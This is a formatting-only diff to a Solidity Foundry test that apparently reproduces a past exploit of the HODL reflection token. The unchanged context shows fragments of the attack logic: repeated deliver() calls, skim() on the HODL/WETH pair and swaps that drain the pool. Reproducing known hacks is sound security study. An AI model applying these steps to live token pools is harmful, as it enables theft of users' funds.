@@ -13,11 +13,19 @@ import "./../interface.sol";
 // https://explorer.phalcon.xyz/tx/eth/0xedc214a62ff6fd764200ddaa8ceae54f842279eadab80900be5f29d0b75212df
 
 interface IHODL is IERC20 {
-    function deliver(uint256 amount) external;
-    function isExcluded(address account) external returns (bool);
-    function isExcludedFromFee(address account) external returns (bool);
+    function deliver(
+        uint256 amount
+    ) external;
+    function isExcluded(
+        address account
+    ) external returns (bool);
+    function isExcludedFromFee(
+        address account
+    ) external returns (bool);
     function reflectionFromToken(uint256 tAmount, bool deductTransferFee) external returns (uint256);
-    function tokenFromReflection(uint256 rAmount) external returns (uint256);
+    function tokenFromReflection(
+        uint256 rAmount
+    ) external returns (uint256);
 }
 
 contract HODLCapitalExploit is Test {
@@ -191,7 +199,9 @@ contract HODLCapitalExploit is Test {
         hodl.transfer(excludedFromFeeAddress, 1);
     }
 
-    function func1eae(uint256 v0) internal {
+    function func1eae(
+        uint256 v0
+    ) internal {
         (uint256 reserve0, uint256 reserve1,) = hodl_weth.getReserves();
         uint256 amountIn = getAmountIn(amount1000 / 100_000 * v0, reserve0, reserve1);
         weth.transfer(address(hodl_weth), amountIn);
@@ -199,12 +209,16 @@ contract HODLCapitalExploit is Test {
         hodl.transfer(excludedFromFeeAddress, 1);
     }
 
-    function func2574(uint256 v0) internal {
+    function func2574(
+        uint256 v0
+    ) internal {
         hodl.deliver(amount1000 * v0 / 1000);
         hodl_weth.skim(excludedFromFeeAddress);
     }
 
-    function func26cd(uint256 v0) internal {
+    function func26cd(
+        uint256 v0
+    ) internal {
         hodl.deliver(amount1000 * v0 / 1000);
     }
 
